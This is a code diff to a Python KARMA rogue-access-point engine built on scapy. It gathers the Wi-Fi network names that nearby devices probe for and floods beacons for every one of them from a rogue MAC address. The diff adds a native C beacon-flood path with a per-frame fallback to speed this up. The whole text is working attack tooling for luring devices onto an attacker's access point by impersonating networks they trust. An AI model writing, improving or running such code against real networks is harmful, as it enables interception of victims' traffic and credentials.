@@ -17,6 +17,12 @@ from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, RadioTap
 
 from .config import BEACON_INTERVAL, WIFI_BROADCAST, log
 
+try:
+    from .native.beacon_flood import beacon_flood as native_beacon_flood
+    _HAS_NATIVE = True
+except ImportError:
+    _HAS_NATIVE = False
+
 
 class KARMAEngine:
     """
@@ -66,21 +72,47 @@ class KARMAEngine:
                     self._start_time = now
                     self._beacon_count += 1
 
+                # Collect all SSIDs from probed sets
+                all_ssids = []
                 for ssid_set in self._probed_ssids.values():
                     for ssid in ssid_set:
                         if not self.running:
                             break
-                        frame = self._build_beacon(ssid)
-                        try:
-                            sendp(frame, iface=self.interface, verbose=False)
-                        except Exception as e:
-                            log.error(f"KARMA beacon send failed: {e}")
-                        time.sleep(BEACON_INTERVAL)
+                        all_ssids.append(ssid if isinstance(ssid, str) else ssid.decode(errors='ignore'))
+
+                if not self.running:
+                    break
+
+                if _HAS_NATIVE and all_ssids:
+                    # Use native C beacon flood for better performance
+                    try:
+                        native_beacon_flood(self.interface, self.rogue_mac, all_ssids)
+                        self._beacon_count += len(all_ssids)
+                    except Exception as e:
+                        log.warning(f"Native KARMA beacon flood failed, falling back to sendp: {e}")
+                        self._sendp_fallback(all_ssids)
+                elif all_ssids:
+                    self._sendp_fallback(all_ssids)
+                else:
+                    time.sleep(0.1)  # No SSIDs yet, wait briefly
             except Exception as e:
                 log.error(f"KARMA beacon loop error: {e}")
                 if not self.running:
                     break
                 time.sleep(1)  # Prevent tight error loop
+
+    def _sendp_fallback(self, ssids):
+        """Fallback: send beacons one at a time via scapy sendp."""
+        for ssid in ssids:
+            if not self.running:
+                break
+            frame = self._build_beacon(ssid)
+            try:
+                sendp(frame, iface=self.interface, verbose=False)
+                self._beacon_count += 1
+            except Exception as e:
+                log.error(f"KARMA beacon send failed: {e}")
+            time.sleep(BEACON_INTERVAL)
 
     def start(self):
         if self.running:
